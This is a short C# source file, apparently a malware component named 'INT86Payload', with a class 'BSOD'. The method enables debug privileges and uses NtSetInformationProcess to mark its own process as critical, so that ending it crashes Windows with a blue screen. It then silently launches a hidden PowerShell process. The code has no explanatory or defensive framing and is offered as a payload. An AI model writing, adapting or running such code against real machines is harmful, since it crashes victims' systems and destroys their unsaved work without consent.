using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace INT86Payload
{
    public class BSOD
    {
        public static void bsod_start()
        {
            Process.EnterDebugMode();
            dllimport.dport.NtSetInformationProcess(Process.GetCurrentProcess().Handle, dllimport.dport.BreakOnTermination, ref dllimport.dport.isCritical, sizeof(int));

            ProcessStartInfo processStartInfo = new ProcessStartInfo("powershell.exe", "wininit");
            processStartInfo.CreateNoWindow = true;
            processStartInfo.UseShellExecute = false;
            Process process = Process.Start(processStartInfo);
            process.WaitForExit();
        }
    }
}
